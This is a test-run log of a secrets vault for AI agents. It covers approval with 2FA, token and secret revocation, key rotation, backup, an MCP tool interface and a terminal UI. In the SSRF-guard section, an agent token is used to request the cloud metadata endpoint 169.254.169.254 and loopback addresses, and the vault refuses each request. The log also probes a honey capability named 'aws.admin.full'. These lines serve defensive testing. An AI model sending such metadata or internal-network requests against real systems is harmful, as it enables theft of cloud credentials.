{"error":"PolicyDeniedError","detail":"Agent 'coder' approval denied for 'PROD_DB_PASSWORD' (github/ci-build): approval timed out after 20s","incident_id":"78fe712b9218c361"}

[HTTP 403]

## D3'. Timeout: nobody answers (approval-timeout 20s)

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'
{"error":"PolicyDeniedError","detail":"Agent 'coder' approval denied for 'GITHUB_TOKEN' (github/ci-build): approval timed out after 20s","incident_id":"9d1324b0fc16ca8a"}

[HTTP 403]

## (finding: an 'operator' name in the approve body that differs from the token's agent is refused with 'agent does not match the authenticated token'. Re-run with an empty body.)

## D1''. approve, no 2FA

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"http_get_with_auth","purpose":"ci-build","params":{"url":"https://127.0.0.1:18443/user"}}'

$ curl -X POST :8765/v1/requests/f693d44a-9130-478a-9b3f-0745e5992c38/approve  [as operator]  -d '{}'
{"decision":"approved","ok":true,"request_id":"f693d44a-9130-478a-9b3f-0745e5992c38"}

[HTTP 200]
{"action":"http_get_with_auth","ok":true,"result":{"body_text":"{\"authenticated\": true, \"path\": \"/user\", \"method\": \"GET\", \"login\": \"octo-demo\", \"body_bytes\": 0}","content_type":"application/json","headers":{"Content-Length":"96","Content-Type":"application/json","Date":"Sat, 28 Nov 2026 03:47:18 GMT","Server":"BaseHTTP/0.6 Python/3.12.3"},"status":200,"truncated":false}}

[HTTP 200]

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"http_get_with_auth","purpose":"ci-build","params":{"url":"https://127.0.0.1:18443/user"}}'
{"action":"http_get_with_auth","ok":true,"result":{"body_text":"{\"authenticated\": true, \"path\": \"/user\", \"method\": \"GET\", \"login\": \"octo-demo\", \"body_bytes\": 0}","content_type":"application/json","headers":{"Content-Length":"96","Content-Type":"application/json","Date":"Sat, 28 Nov 2026 03:47:18 GMT","Server":"BaseHTTP/0.6 Python/3.12.3"},"status":200,"truncated":false}}

[HTTP 200]

## D2''. 2FA-required secret: no code, wrong code, right code

$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'

$ curl -X POST :8765/v1/requests/69ec96b0-8cc6-407e-898a-ebad55938543/approve  [as operator]  -d '{}'
{"error":"ApprovalError","detail":"approval error: invalid or missing 2FA code","incident_id":"d38a767adf65f16f"}

[HTTP 400]

$ curl -X POST :8765/v1/requests/69ec96b0-8cc6-407e-898a-ebad55938543/approve  [as operator]  -d '{"totp_code":"<code>"}'
{"error":"ApprovalError","detail":"approval error: invalid or missing 2FA code","incident_id":"efbed52fe49d6941"}

[HTTP 400]

$ curl -X POST :8765/v1/requests/69ec96b0-8cc6-407e-898a-ebad55938543/approve  [as operator]  -d '{"totp_code":"<code>"}'
{"decision":"approved","ok":true,"request_id":"69ec96b0-8cc6-407e-898a-ebad55938543"}

[HTTP 200]
{"action":"echo","ok":true,"result":{"leaked_secret":false,"message":"lease ok; secret NOT returned","ok":true,"secret_len":20}}

[HTTP 200]

$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'
{"action":"echo","ok":true,"result":{"leaked_secret":false,"message":"lease ok; secret NOT returned","ok":true,"secret_len":20}}

[HTTP 200]

## D2b''. replay of the same TOTP code on a new request, then deny

$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'

$ curl -X POST :8765/v1/requests/6e995dd6-3032-42ea-9a5a-f151da15c0de/approve  [as operator]  -d '{"totp_code":"<code>"}'
{"error":"ApprovalError","detail":"approval error: invalid or missing 2FA code: 2FA code already used","incident_id":"306f9784e4c9465b"}

[HTTP 400]

$ curl -X POST :8765/v1/requests/6e995dd6-3032-42ea-9a5a-f151da15c0de/deny  [as operator]  -d '{"reason":"not expected right now"}'
{"decision":"denied","ok":true,"request_id":"6e995dd6-3032-42ea-9a5a-f151da15c0de"}

[HTTP 200]
{"error":"PolicyDeniedError","detail":"Agent 'coder' approval denied for 'PROD_DB_PASSWORD' (github/ci-build): not expected right now","incident_id":"9054eba17bda2506"}

[HTTP 403]

$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'
{"error":"PolicyDeniedError","detail":"Agent 'coder' approval denied for 'PROD_DB_PASSWORD' (github/ci-build): not expected right now","incident_id":"9054eba17bda2506"}

[HTTP 403]
2026/11/27 22:47:19 WARNING: security event APPROVAL_BAD_CODE request="69ec96b0-8cc6-407e-898a-ebad55938543" agent="" operator="tok_<id>" detail="request=69ec96b0-8cc6-407e-898a-ebad55938543 token=tok_<id> ip=127.0.0.1 attempt=1/5"
2026/11/27 22:47:19 WARNING: security event APPROVAL_BAD_CODE request="69ec96b0-8cc6-407e-898a-ebad55938543" agent="" operator="tok_<id>" detail="request=69ec96b0-8cc6-407e-898a-ebad55938543 token=tok_<id> ip=127.0.0.1 attempt=2/5"
2026/11/27 22:47:20 WARNING: security event APPROVAL_CODE_REPLAY request="6e995dd6-3032-42ea-9a5a-f151da15c0de" agent="" operator="tok_<id>" detail="request=6e995dd6-3032-42ea-9a5a-f151da15c0de token=tok_<id> ip=127.0.0.1 attempt=1/5"

$ rgt-vault audit --limit 12
{"entries":[{"id":197,"action":"HTTP_API","secret_name":null,"timestamp":"2026-11-28T03:47:20.610016+00:00","details":"token=tok_<id> ip=127.0.0.1 GET /v1/audit","prev_hash":"dc4de23e27f9e6ae0c0f3fbca98960e234b711c6703742c927e5a33c003bf03f","entry_hash":"d1a473ac2a0f813cf0e6c9514a382d070891f44f3647da778644a36c9f643867","policy_hash":"bf80e8f81c5a08a7","agent_id":"operator"},{"id":196,"action":"APPROVAL_DENIED","secret_name":"PROD_DB_PASSWORD","timestamp":"2026-11-28T03:47:20.590419+00:00","details":"Agent: coder, Namespace: github, Reason: not expected right now","prev_hash":"9d8ae24f16139e5500cfe1b17ef4bdcfd50e1e08c232310c64b8a99a8d1c617d","entry_hash":"dc4de23e27f9e6ae0c0f3fbca98960e234b711c6703742c927e5a33c003bf03f","policy_hash":"bf80e8f81c5a08a7","agent_id":null},{"id":195,"action":"HTTP_OPERATOR","secret_name":null,"timestamp":"2026-11-28T03:47:20.590125+00:00","details":"token=tok_<id> ip=127.0.0.1 POST /v1/requests/6e995dd6-3032-42ea-9a5a-f151da15c0de/deny","prev_hash":"61cf8ddaa445f491d935c9ce98b57973a9cd43e1a0926c748cc77b293af88ee9","entry_hash":"9d8ae24f16139e5500cfe1b17ef4bdcfd50e1e08c232310c64b8a99a8d1c617d","policy_hash":"bf80e8f81c5a08a7","agent_id":"operator"},{"id":194,"action":"APPROVAL_CODE_REPLAY","secret_name":null,"timestamp":"2026-11-28T03:47:20.579576+00:00","details":"request=6e995dd6-3032-42ea-9a5a-f151da15c0de token=tok_<id> ip=127.0.0.1 attempt=1/5","prev_hash":"9c264a2b6b4cb7e71769a79454e3a31358f750130e8def6b05dbf6098ba6b3e0","entry_hash":"61cf8ddaa445f491d935c9ce98b57973a9cd43e1a0926c748cc77b293af88ee9","policy_hash":"bf80e8f81c5a08a7","agent_id":"operator"},{"id":193,"action":"HTTP_OPERATOR","secret_name":null,"timestamp":"2026-11-28T03:47:20.579419+00:00","details":"token=tok_<id> ip=127.0.0.1 POST /v1/requests/6e995dd6-3032-42ea-9a5a-f151da15c0de/approve","prev_hash":"7bdc893572651dbf158ff28d23739d275cb9d98c5103f92a936d474a95497efd","entry_hash":"9c264a2b6b4cb7e71769a79454e3a31358f750130e8def6b05dbf6098ba6b3e0","policy_hash":"bf80e8f81c5a08a7","agent_id":"operator"},{"id":192,"action":"HTTP_OPERATOR","secret_name":null,"timestamp":"2026-11-28T03:47:20.558635+00:00","details":"token=tok_<id> ip=127.0.0.1 GET /v1/requests","prev_hash":"a15c4bcc7d1d37a7e05c9b614a6fe96e983f14268a642b505db28eb383aa19ca","entry_hash":"7bdc893572651dbf158ff28d23739d275cb9d98c5103f92a936d474a95497efd","policy_hash":"bf80e8f81c5a08a7","agent_id":"operator"},{"id":191,"action":"HOOK_READ","secret_name":"PROD_DB_PASSWORD","timestamp":"2026-11-28T03:47:19.553417+00:00","details":"{\"hook_id\": \"off\", \"decision\": \"allow\", \"reason\": \"hook disabled\"}","prev_hash":"5288cb8c403ee608f72ca85d6ef646399804a369758ebe36d79fad4206ebee02","entry_hash":"a15c4bcc7d1d37a7e05c9b614a6fe96e983f14268a642b505db28eb383aa19ca","policy_hash":"bf80e8f81c5a08a7","agent_id":null},{"id":190,"action":"HTTP_API","secret_name":null,"timestamp":"2026-11-28T03:47:19.553254+00:00","details":"token=tok_<id> ip=127.0.0.1 POST /v1/secrets/github/PROD_DB_PASSWORD/use","prev_hash":"311b45ed319d54028c92c621f3a7afa7e55ea6ae2d188ec6cb9202ff529c27a3","entry_hash":"5288cb8c403ee608f72ca85d6ef646399804a369758ebe36d79fad4206ebee02","policy_hash":"bf80e8f81c5a08a7","agent_id":"coder"},{"id":189,"action":"LEASE_RETURNED","secret_name":"PROD_DB_PASSWORD","timestamp":"2026-11-28T03:47:19.544001+00:00","details":"Agent: coder","prev_hash":"8e72660ecc1f8431bc1a3f8580c76b22cc122298ecc6559af98202693bdbb260","entry_hash":"311b45ed319d54028c92c621f3a7afa7e55ea6ae2d188ec6cb9202ff529c27a3","policy_hash":"bf80e8f81c5a08a7","agent_id":null},{"id":188,"action":"LEASE_GRANTED","secret_name":"PROD_DB_PASSWORD","timestamp":"2026-11-28T03:47:19.543940+00:00","details":"Agent: coder","prev_hash":"7b4c67e58d40301b10e32674bcb3b0e3d2586a46cb51051fb87b6d0f46d7f896","entry_hash":"8e72660ecc1f8431bc1a3f8580c76b22cc122298ecc6559af98202693bdbb260","policy_hash":"bf80e8f81c5a08a7","agent_id":null},{"id":187,"action":"GET_SECRET","secret_name":"PROD_DB_PASSWORD","timestamp":"2026-11-28T03:47:19.543846+00:00","details":"Version latest accessed from github","prev_hash":"62dbcad9e7bb9bbb9845e75b0e02ed318d88d27b263e3374b592be4536daf07b","entry_hash":"7b4c67e58d40301b10e32674bcb3b0e3d2586a46cb51051fb87b6d0f46d7f896","policy_hash":"bf80e8f81c5a08a7","agent_id":null},{"id":186,"action":"APPROVAL_APPROVED","secret_name":null,"timestamp":"2026-11-28T03:47:19.543464+00:00","details":"request=69ec96b0-8cc6-407e-898a-ebad55938543 token=tok_<id> ip=127.0.0.1","prev_hash":"51d9f792bfb696eee68c112a0f71572d967609836d0528a6333c06f7dc5fb58d","entry_hash":"62dbcad9e7bb9bbb9845e75b0e02ed318d88d27b263e3374b592be4536daf07b","policy_hash":"bf80e8f81c5a08a7","agent_id":"operator"}]}
[exit 0]
186 APPROVAL_APPROVED operator None request=69ec96b0-8cc6-407e-898a-ebad55938543 token=tok_<id> ip=127.0.0.1
187 GET_SECRET None PROD_DB_PASSWORD Version latest accessed from github
188 LEASE_GRANTED None PROD_DB_PASSWORD Agent: coder
189 LEASE_RETURNED None PROD_DB_PASSWORD Agent: coder
190 HTTP_API coder None token=tok_<id> ip=127.0.0.1 POST /v1/secrets/github/PROD_DB_PASSWORD/use
191 HOOK_READ None PROD_DB_PASSWORD {"hook_id": "off", "decision": "allow", "reason": "hook disabled"}
192 HTTP_OPERATOR operator None token=tok_<id> ip=127.0.0.1 GET /v1/requests
193 HTTP_OPERATOR operator None token=tok_<id> ip=127.0.0.1 POST /v1/requests/6e995dd6-3032-42ea-9a5a-f151da15c0de/approve
194 APPROVAL_CODE_REPLAY operator None request=6e995dd6-3032-42ea-9a5a-f151da15c0de token=tok_<id> ip=127.0.0.1 attempt=1/5
195 HTTP_OPERATOR operator None token=tok_<id> ip=127.0.0.1 POST /v1/requests/6e995dd6-3032-42ea-9a5a-f151da15c0de/deny
196 APPROVAL_DENIED None PROD_DB_PASSWORD Agent: coder, Namespace: github, Reason: not expected right now
197 HTTP_API operator None token=tok_<id> ip=127.0.0.1 GET /v1/audit

## E. Rotation, export/import, revoke (server without approval, WITHOUT --allow-private-network)

$ rgt-vault serve --policy policy.yaml &
2026/11/27 22:47:33 Token store: ~/.config/rgt-vault/tokens.json (5 tokens, 1 with operator scope)
2026/11/27 22:47:33 No --harness-key-file: /v1/capabilities/execute fails closed
==============================================
  rgt-vault server
  Listening on 127.0.0.1:8765
  Vault: ~/.secure-vault/vault.db (id de1f0677-81eb-47c9-ab98-fbe80c1a3fba, epoch 1)
  Health check: http://127.0.0.1:8765/healthz
  Auth: per-agent tokens from ~/.config/rgt-vault/tokens.json (5)
==============================================
2026/11/27 22:47:33 Starting HTTP server on 127.0.0.1:8765

$ rgt-vault rotate --target dek
Rotation complete.
[exit 0]

$ rgt-vault rotate --target master
Rotation complete.
[exit 0]

$ rgt-vault rotate
Rotation complete.
[exit 0]

$ env RGT_VAULT_TOKEN_FILE=coder.token rgt-vault rotate --target dek
Error: rotate failed: HTTP 403
[exit 1]

$ env RGT_VAULT_TOKEN_FILE=deploy.token rgt-vault get DEPLOY_KEY --namespace deploy
deploy-key-material-123
[exit 0]

$ rgt-vault status --offline
vault_id:     de1f0677-81eb-47c9-ab98-fbe80c1a3fba
key_epoch:    4
active secrets: 4
  deploy: 1
  github: 2
  prod: 1
audit rows:   213
last action:  2026-11-28T03:47:36.719879+00:00  SECRET_READ  DEPLOY_KEY
audit chain:  OK
[exit 0]

## E2. SSRF guard (no --allow-private-network): loopback, metadata, http://

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"http_get_with_auth","purpose":"ci-build","params":{"url":"https://127.0.0.1:18443/user"}}'
{"error":"ActionExecutionError","detail":"Refusing to call private/internal address for host \"127.0.0.1\". Start the server with --allow-private-network if this is intentional.","incident_id":"c361d472db2172e3"}

[HTTP 500]

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"http_get_with_auth","purpose":"ci-build","params":{"url":"https://169.254.169.254/latest/meta-data/"}}'
{"error":"ActionExecutionError","detail":"Refusing to call private/internal address for host \"169.254.169.254\". Start the server with --allow-private-network if this is intentional.","incident_id":"d4a9f266391dcd58"}

[HTTP 500]

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"http_get_with_auth","purpose":"ci-build","params":{"url":"http://example.com/"}}'
{"error":"ActionExecutionError","detail":"plain http:// is refused for requests that carry a credential; use https","incident_id":"b194fd732c2dae5f"}

[HTTP 500]

## E3. export / import / revoke

$ rgt-vault export --out backup.b64
Exported to backup.b64
[exit 0]

$ ls -la backup.b64; head -c 60 backup.b64; echo; base64 -d backup.b64 | python3 -I -c "import json,sys; d=json.load(sys.stdin); print({k:(len(v) if isinstance(v,list) else v) for k,v in d.items()})"
-rw------- 1 will will 149133 Nov 27 22:47 backup.b64
ewogICJzZWNyZXRzIjogWwogICAgewogICAgICAiaWQiOiAxLAogICAgICAi
{'secrets': 4, 'audit_logs': 228, 'honeytokens': 0, 'vault_id': 'de1f0677-81eb-47c9-ab98-fbe80c1a3fba'}
[exit 0]

$ env RGT_VAULT_TOKEN_FILE=coder.token rgt-vault revoke GITHUB_TOKEN --namespace github
Error: revoke failed: HTTP 403
[exit 1]

$ rgt-vault revoke GITHUB_TOKEN --namespace github --as-operator
Secret revoked.
[exit 0]

$ rgt-vault list --namespace github --as-operator
PROD_DB_PASSWORD	2026-11-28T03:43:57.689953+00:00
[exit 0]

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'
{"error":"SecretNotFoundError","detail":"Secret 'github/GITHUB_TOKEN' not found.","incident_id":"09bb1b08f9d73b77"}

[HTTP 404]

$ rgt-vault import --in backup.b64 --yes
Import complete.
[exit 0]

$ rgt-vault import --in backup.b64
Error: import replaces the vault's secrets, audit log and honeytokens: pass --yes to confirm
[exit 1]

$ rgt-vault import --in backup.b64 --yes
Import complete.
[exit 0]

$ rgt-vault verify-audit --offline
OK
[exit 0]

$ rgt-vault serve --policy policy.yaml &
2026/11/27 22:47:38 Token store: ~/.config/rgt-vault/tokens.json (5 tokens, 1 with operator scope)
2026/11/27 22:47:39 No --harness-key-file: /v1/capabilities/execute fails closed
==============================================
  rgt-vault server
  Listening on 127.0.0.1:8765
  Vault: ~/.secure-vault/vault.db (id de1f0677-81eb-47c9-ab98-fbe80c1a3fba, epoch 4)
  Health check: http://127.0.0.1:8765/healthz
  Auth: per-agent tokens from ~/.config/rgt-vault/tokens.json (5)
==============================================
2026/11/27 22:47:39 Starting HTTP server on 127.0.0.1:8765

$ rgt-vault list --namespace github --as-operator
GITHUB_TOKEN	2026-11-28T03:42:11.539344+00:00
PROD_DB_PASSWORD	2026-11-28T03:43:57.689953+00:00
[exit 0]

$ curl -X POST :8765/v1/secrets/github/GITHUB_TOKEN/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'
{"action":"echo","ok":true,"result":{"leaked_secret":false,"message":"lease ok; secret NOT returned","ok":true,"secret_len":39}}

[HTTP 200]

## E4. token revoke takes effect on a running server

$ rgt-vault token revoke tok_<id>
WARNING: TOKEN_REVOKED token=tok_<id> agent=rogue scopes=agent expires=never by=will
revoked id tok_<id>  agent rogue  scopes agent  expires never
[exit 0]

$ curl -X GET :8765/v1/secrets?namespace=github  [as rogue]
{"error":"ServerAuthError","detail":"invalid credentials","incident_id":"1fc98d5fcbd9bade"}

[HTTP 401]

$ rgt-vault crypto-audit
rgt-vault Cryptographic Audit (Go)
  Cipher:           AES-256-GCM (256-bit key, 96-bit nonce, 128-bit tag)
  AAD Bindings:     secret=vault_id:namespace:name | wrap=vault_id:epoch
  KDF Pipeline:     Argon2id -> HKDF-SHA512 -> HKDF-SHA256 (nonce expansion)
  Argon2id Default: memory=262144 KiB (256 MiB), time=4, parallelism=4, salt=32 bytes
  Policy Source:    built-in defaults
  Policy Floors:    memory>=262144 KiB, time>=4, parallelism>=4, salt>=32 bytes
  Key Sizes:        master=32 B, DEK=32 B, KEK=32 B, bearer=32 B, captoken>=32 B, TOTP=20 B
  DEK Rotation:     max_encryptions=100000000, max_bytes=549755813888 (512 GiB)
  CSPRNG:           crypto/rand (OS CSPRNG) — PASS
  SelfTest (KAT):   PASS
  Live probe:       Encrypt/Decrypt round trip, nonce/tag from real ciphertext — PASS
  Live probe:       default-KDF keychain.json written, read back, unwrapped — PASS
  Live probe:       bearer/TOTP/capability-token sizes from real generators — PASS
  Argon2id Timing:  272 ms for one wrap at default params (informational)
  Overall:          PASS
[exit 0]

$ rgt-vault serve --policy policy.yaml --allow-private-network --harness-key-file ~/.config/rgt-vault/harness.key &
2026/11/27 22:48:01 Token store: ~/.config/rgt-vault/tokens.json (4 tokens, 1 with operator scope)
2026/11/27 22:48:01 WARNING: --allow-private-network enables the built-in HTTP actions to call loopback / RFC1918 addresses. Any caller with a valid bearer token can use this to probe internal services (SSRF). Only enable on trusted networks.
==============================================
  rgt-vault server
  Listening on 127.0.0.1:8765
  Vault: ~/.secure-vault/vault.db (id de1f0677-81eb-47c9-ab98-fbe80c1a3fba, epoch 4)
  Health check: http://127.0.0.1:8765/healthz
  Auth: per-agent tokens from ~/.config/rgt-vault/tokens.json (4)
==============================================
2026/11/27 22:48:02 Starting HTTP server on 127.0.0.1:8765

## F. MCP server over stdio, driven by a scripted client, as agent 'coder' (scope agent)

$ RGT_VAULT_TOKEN_FILE=coder.token rgt-vault mcp   (scripted JSON-RPC client)
initialize -> {"name": "rgt-vault-mcp", "version": "0.3.0"} protocol 2025-06-18 caps ['resources', 'tools']
tool: list_secrets | args: ['namespace'] | required: ['namespace'] | List secret names in a namespace (no plaintext).
tool: lease_secret | args: ['name', 'namespace'] | required: ['namespace', 'name'] | Lease a secret: return its plaintext value for use by the agent.
tool: revoke_secret | args: ['name', 'namespace'] | required: ['namespace', 'name'] | Revoke (soft-delete) a secret.
tool: execute_secret | args: ['action', 'name', 'namespace', 'params', 'purpose'] | required: ['namespace', 'name', 'action'] | Execute a bounded action using a secret without returning the plaintext.
tool: execute_capability | args: ['agent_id', 'capability', 'capability_token', 'payload', 'version'] | required: ['capability'] | Execute a registered capability with a v2 capability token (Agent Capability Platform). Returns the capability
tool: list_capabilities | args: ['agent'] | required: [] | List the capabilities an agent may execute (names, versions, parameter names).
resources: [('vault://policy', 'policy')]
read vault://policy -> {"contents": [{"mimeType": "application/json", "text": "{\"default_ttl\":300,\"rules\":null}", "uri": "vault://policy"}]}

call list_secrets {"namespace": "github"}
  -> isError=True {"content": [{"text": "backend error: 403 Forbidden", "type": "text"}], "isError": true}

call list_secrets {"namespace": "deploy"}
  -> isError=True {"content": [{"text": "backend error: 403 Forbidden", "type": "text"}], "isError": true}

call execute_secret {"namespace": "github", "name": "GITHUB_TOKEN", "action": "http_get_with_auth", "purpose": "ci-build", "params": {"url": "https://127.0.0.1:18443/user"}}
  -> isError=False {"content": [{"text": "{\"action\":\"http_get_with_auth\",\"ok\":true,\"result\":{\"body_text\":\"{\\"authenticated\\": true, \\"path\\": \\"/user\\", \\"method\\": \\"GET\\", \\"login\\": \\"octo-demo\\", \\"body_bytes\\": 0}\",\"content_type\":\"application/json\",\"headers\":{\"Content-Length\":\"96\",\"Content-Type\":\"application/json\",\"Date\":\"Sat, 28 Nov 2026 03:48:02 GMT\",\"Server\":\"BaseHTTP/0.6 Python/3.12.3\"},\"status\":200,\"truncated\":false}}\n", "type": "text"}], "isError": false}

call execute_secret {"namespace": "github", "name": "GITHUB_TOKEN", "action": "http_get_with_auth", "purpose": "billing", "params": {"url": "https://127.0.0.1:18443/user"}}
  -> isError=True {"content": [{"text": "backend error: 403 Forbidden", "type": "text"}], "isError": true}

call lease_secret {"namespace": "github", "name": "GITHUB_TOKEN"}
  -> isError=True {"content": [{"text": "backend error: 403 Forbidden", "type": "text"}], "isError": true}

call list_capabilities {}
  -> isError=False {"content": [{"text": "{\"agent\":\"coder\",\"capabilities\":[]}", "type": "text"}], "isError": false}

call execute_capability {"capability": "aws.admin.full", "capability_token": "x.y", "payload": {}}
  -> isError=True {"content": [{"text": "unauthorized", "type": "text"}], "isError": true}

call revoke_secret {"namespace": "github", "name": "GITHUB_TOKEN"}
  -> isError=True {"content": [{"text": "backend error: 403 Forbidden", "type": "text"}], "isError": true}

[server stderr]
rgt-vault mcp: 2026/11/27 22:48:02 list_secrets backend error: 403 Forbidden - "{\"error\":\"PolicyDeniedError\",\"detail\":\"Unauthorized to access namespace 'github'\",\"incident_id\":\"d3fcea50c950b6d5\"}\n"
rgt-vault mcp: 2026/11/27 22:48:02 list_secrets backend error: 403 Forbidden - "{\"error\":\"PolicyDeniedError\",\"detail\":\"Unauthorized to access namespace 'deploy'\",\"incident_id\":\"59b084a6a904a96f\"}\n"
rgt-vault mcp: 2026/11/27 22:48:02 execute_secret backend error: 403 Forbidden - "{\"error\":\"PolicyDeniedError\",\"detail\":\"Agent 'coder' denied read access to 'GITHUB_TOKEN' (github/billing)\",\"incident_id\":\"37e54fbf5fd5b9a8\"}\n"
rgt-vault mcp: 2026/11/27 22:48:02 lease_secret backend error: 403 Forbidden - "{\"error\":\"AuthorizationError\",\"detail\":\"insufficient scope for this route\",\"incident_id\":\"2394a0867be1a432\"}\n"
rgt-vault mcp: 2026/11/27 22:48:02 execute_capability backend error: 403 Forbidden - "{\"error\":\"PolicyDeniedError\",\"detail\":\"capability token rejected: token base64 decode failed\",\"incident_id\":\"619c57c5f3c38a6f\"}\n"
rgt-vault mcp: 2026/11/27 22:48:02 revoke_secret backend error: 403 Forbidden - "{\"error\":\"PolicyDeniedError\",\"detail\":\"Unauthorized to revoke secret.\",\"incident_id\":\"38735732cdbbd41e\"}\n"


$ rgt-vault serve --policy policy.yaml --allow-private-network --require-approval --totp-secret-file ~/.config/rgt-vault/totp.secret --approval-timeout 60s &
2026/11/27 22:48:24 Token store: ~/.config/rgt-vault/tokens.json (4 tokens, 1 with operator scope)
2026/11/27 22:48:24 WARNING: --allow-private-network enables the built-in HTTP actions to call loopback / RFC1918 addresses. Any caller with a valid bearer token can use this to probe internal services (SSRF). Only enable on trusted networks.
2026/11/27 22:48:24 No --harness-key-file: /v1/capabilities/execute fails closed
==============================================
  rgt-vault server
  Listening on 127.0.0.1:8765
  Vault: ~/.secure-vault/vault.db (id de1f0677-81eb-47c9-ab98-fbe80c1a3fba, epoch 4)
  Health check: http://127.0.0.1:8765/healthz
  Auth: per-agent tokens from ~/.config/rgt-vault/tokens.json (4)
==============================================
2026/11/27 22:48:24 Starting HTTP server on 127.0.0.1:8765

## G. TUI smoke (tmux pty 110x32), as operator; approve a 2FA request from the TUI

--- TUI screen: dashboard (namespace github) ---
[● online] [audit: OK] Namespace: github
  NAME                  FINGERPRINT  2FA  NOTE
> GITHUB_TOKEN          ad91e681     no
  PROD_DB_PASSWORD      3dbdbf73     yes  prod db; needs TOTP
[/] search | [r] rotate | [a] audit | [P] panic-lock | [t] tree | [c] copy | [tab] requests | [?] help | [q] q

--- TUI screen: help (?) ---
RGT-Vault Dashboard Help
========================
  /        Search secrets
  r        Rotate master key
  P        Panic lock & exit
  t        Toggle tree view
  a        Live audit log stream
  tab/i    Pending approval requests (approve/deny)
  c        Copy fingerprint to clipboard
  ?        Show help
  q/ctrl+c Quit
  up/k     Move cursor up
  down/j   Move cursor down
Press any key to return...

--- TUI screen: audit stream (a) ---
Live Audit Log Stream
03:48:02 | LEASE_GRANTED   |            | Agent: coder
03:48:02 | LEASE_RETURNED  |            | Agent: coder
03:48:02 | HTTP_API        | coder      | token=tok_<id> ip=127.0.0.1 …
03:48:02 | HOOK_READ       |            | {"hook_id": "off", "decision": "allow", …
03:48:02 | POLICY_DENIED   |            | Action: read, Agent: coder, Namespace: g…
03:48:02 | AUTHZ_DENIED    | coder      | token=tok_<id> ip=127.0.0.1 …
03:48:02 | HTTP_API        | coder      | token=tok_<id> ip=127.0.0.1 …
03:48:02 | HTTP_API        | coder      | token=tok_<id> ip=127.0.0.1 …
03:48:02 | HONEY_CAPABILIT… |            | {"agent": "coder", "capability": "aws.ad…
03:48:02 | CAPABILITY_DENI… |            | {"agent": "coder", "capability": "aws.ad…
03:48:02 | HTTP_API        | coder      | token=tok_<id> ip=127.0.0.1 …
03:48:02 | HOOK_REVOKE     |            | {"hook_id": "off", "decision": "allow", …
03:48:02 | POLICY_DENIED   |            | Action: revoke, Agent: coder, Namespace:…
03:48:25 | HTTP_API        | operator   | token=tok_<id> ip=127.0.0.1 …
03:48:25 | HTTP_API        | operator   | token=tok_<id> ip=127.0.0.1 …
03:48:25 | HOOK_LIST       |            | {"hook_id": "off", "decision": "allow", …
03:48:25 | LIST_SECRETS    |            | Listed 2 secrets in github
03:48:25 | HTTP_API        | operator   | token=tok_<id> ip=127.0.0.1 …
03:48:25 | HTTP_API        | operator   | token=tok_<id> ip=127.0.0.1 …
03:48:25 | GET_SECRET      |            | Version latest accessed from github
03:48:25 | GET_SECRET      |            | Version latest accessed from github
03:48:27 | HTTP_API        | operator   | token=tok_<id> ip=127.0.0.1 …
[a/esc] back | [q] quit
streaming audit log...

$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'

--- TUI screen: approvals view (tab) with one pending 2FA request ---
Pending approval requests - Namespace: github
1 pending request(s)
  AGENT          SECRET               NAMESPACE    PURPOSE                  ACTION   2FA
> coder          PROD_DB_PASSWORD     github       ci-build                 read     yes
[a] approve | [d] deny | [r] refresh | [tab] secrets | [q] quit

--- TUI screen: after 'a' (approve) - TOTP prompt? ---
Pending approval requests - Namespace: github
1 pending request(s)
  AGENT          SECRET               NAMESPACE    PURPOSE                  ACTION   2FA
> coder          PROD_DB_PASSWORD     github       ci-build                 read     yes
2FA required to approve 'PROD_DB_PASSWORD' (coder, namespace github)
2FA code: _
[enter] approve | [esc] cancel

--- TUI screen: after entering the TOTP code ---
Pending approval requests - Namespace: github
1 pending request(s)
  AGENT          SECRET               NAMESPACE    PURPOSE                  ACTION   2FA
> coder          PROD_DB_PASSWORD     github       ci-build                 read     yes
2FA required to approve 'PROD_DB_PASSWORD' (coder, namespace github)
2FA code: _
[enter] approve | [esc] cancel
Enter the 2FA code, or esc to cancel.

$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'

[HTTP 000]

--- TUI screen: tree view (t) ---
Pending approval requests - Namespace: github
0 pending request(s)
  (no pending requests)
[a] approve | [d] deny | [r] refresh | [tab] secrets | [q] quit
Approval cancelled (no 2FA code).

## (G cont.) The 6 digits sent in one burst (as a paste would arrive) were ignored: approvals.go accepts only single-key events. Retyping one key at a time:

$ curl -X POST :8765/v1/secrets/github/PROD_DB_PASSWORD/use  [as coder]  -d '{"action":"echo","purpose":"ci-build"}'

--- TUI screen: TOTP typed digit by digit ---
Pending approval requests - Namespace: github
1 pending request(s)
  AGENT          SECRET               NAMESPACE    PURPOSE                  ACTION   2FA
> coder          PROD_DB_PASSWORD     github       ci-build                 read     yes
2FA required to approve 'PROD_DB_PASSWORD' (coder, namespace github)
2FA code: ******_
[enter] approve | [esc] cancel
{"action":"echo","ok":true,"result":{"leaked_secret":false,"message":"lease ok; secret NOT returned","ok":true,"secret_len":20}}

[HTTP 200]

--- TUI screen: after Enter ---
Pending approval requests - Namespace: github
0 pending request(s)
  (no pending requests)
[a] approve | [d] deny | [r] refresh | [tab] secrets | [q] quit
Approved.

